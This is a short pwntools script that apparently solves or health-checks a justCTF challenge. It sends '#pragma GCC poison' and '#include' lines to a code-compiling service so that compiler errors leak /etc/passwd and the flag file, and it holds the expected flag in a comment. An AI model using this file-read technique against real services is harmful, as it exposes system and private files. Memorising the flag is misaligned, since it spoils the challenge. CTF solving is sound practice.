#!/usr/bin/env python2

from pwn import *

context.log_level = 'error'

# Expected flag
#flag = 'justCTF{how_do_you_find_out__you_have_to_use_the_pragma_directive}'

host = args.HOST or '127.0.0.1'
port = int(args.PORT or 1337)

def check_etc_passwd():
    io = connect(host, port)
    io.recvline()
    io.sendline('2')
    io.recvline()
    io.sendline('#pragma GCC poison x')
    io.sendline('#include "/etc/passwd"')
    io.recvline()
    out = io.recv(timeout=10)
    io.close()

    if '/home/aturing' not in out:
        exit(1)

check_etc_passwd()

io = connect(host, port)
io.recvline()
io.sendline('2')
io.recvline()

io.sendline('#pragma GCC poison justCTF')
io.sendline('#include "/home/aturing/flag"')
io.recvline()
out = io.recv(timeout=10)

if 'justCTF' in out:
    print(out)
    exit(0)
else:
    exit(1)
